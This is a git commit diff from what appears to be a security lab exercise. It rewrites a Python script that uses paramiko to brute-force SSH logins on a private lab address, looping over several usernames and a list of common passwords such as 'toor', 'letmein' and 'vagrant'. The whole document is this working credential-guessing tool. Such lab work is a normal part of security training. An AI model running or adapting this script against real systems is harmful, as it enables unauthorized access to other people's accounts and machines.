d2c0ff7e8511c6b8988506d3d89e41a6e512864d
Hassan <51971397+Hassanxsa@users.noreply.github.com>
2025-05-03 16:18:52 +0300

    Completed Phase 3

--- Phase 1/custom_script.py
+++ Phase 1/custom_script.py
@@ -1,20 +1,28 @@
 import paramiko
-import sys
 
 # Target information
 target_ip = '192.10.20.4'
-username = 'vagrant'
-password_list = ['vagrant', 'admin', 'password']  # Example password list
+usernames = ['test', 'admin', 'vagrant']  # Example usernames
+passwords = ['123456', 'password', 'admin', 'root',
+             'letmein', 'qwerty', 'vagrant','abc123', 
+             'toor', 'user']  # 10 passwords
 
-for password in password_list:
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(target_ip, username=username, password=password)
-        print(f'Success: {username}:{password}')
-        client.close()
-        break
-    except paramiko.AuthenticationException:
-        print(f'Failed: {username}:{password}')
-    except Exception as e:
-        print(f'Error: {e}')
+for username in usernames:
+    for password in passwords:
+        try:
+            print(f"Trying: {username}:{password}")
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(target_ip, username=username, password=password, timeout=5)
+            print(f"Success: {username}:{password}")
+            client.close()
+            break
+        except paramiko.AuthenticationException:
+            print(f"Failed: {username}:{password}")
+        except Exception as e:
+            print(f"Error: {e}")
+
+        
+        
+        
+        
